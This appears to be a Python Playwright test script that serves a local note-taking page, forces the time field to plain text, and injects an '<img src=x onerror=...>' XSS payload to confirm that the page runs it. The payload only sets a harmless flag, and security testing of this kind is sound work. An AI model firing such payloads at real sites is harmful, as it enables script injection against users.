import asyncio
from playwright.async_api import async_playwright
import subprocess
import time
import os
import signal

async def run_test():
    # Start the server on port 8000
    server_process = subprocess.Popen(["python3", "-m", "http.server", "8000"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)  # Wait for server to start

    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context()
            page = await context.new_page()

            # Bypass loading by blocking external CDNs that might be slow/down
            await page.route("**", lambda route: route.abort() if any(cdn in route.request.url for cdn in ["tailwindcss.com", "googleapis.com", "gstatic.com", "unsplash.com"]) else route.continue_())

            # Handle dialogs (like alert)
            async def handle_dialog(dialog):
                print(f"Dialog appeared: {dialog.message}")
                await dialog.dismiss()

            page.on("dialog", handle_dialog)

            print("Navigating to http://127.0.0.1:8000/index.html")
            await page.goto("http://127.0.0.1:8000/index.html", timeout=30000, wait_until="domcontentloaded")

            # Exploitation
            print("Attempting exploitation...")
            await page.evaluate("""
                const taskInput = document.getElementById('note-task');
                const timeInput = document.getElementById('note-time');
                const submitBtn = document.getElementById('button');

                taskInput.value = 'Malicious Task';
                // Change type to text to bypass time picker restrictions
                timeInput.type = 'text';
                timeInput.value = '<img src=x onerror="window.xss_vulnerable = true">';
                submitBtn.click();
            """)

            # Wait a bit for the image error to trigger
            print("Waiting for payload execution...")
            await asyncio.sleep(2)

            # Check if the injection was successful
            is_vulnerable = await page.evaluate("window.xss_vulnerable === true")

            if is_vulnerable:
                print("VULNERABILITY CONFIRMED: XSS executed!")
            else:
                print("Vulnerability not triggered.")

            await browser.close()
    finally:
        print("Stopping server...")
        server_process.terminate()
        server_process.wait()

if __name__ == "__main__":
    asyncio.run(run_test())
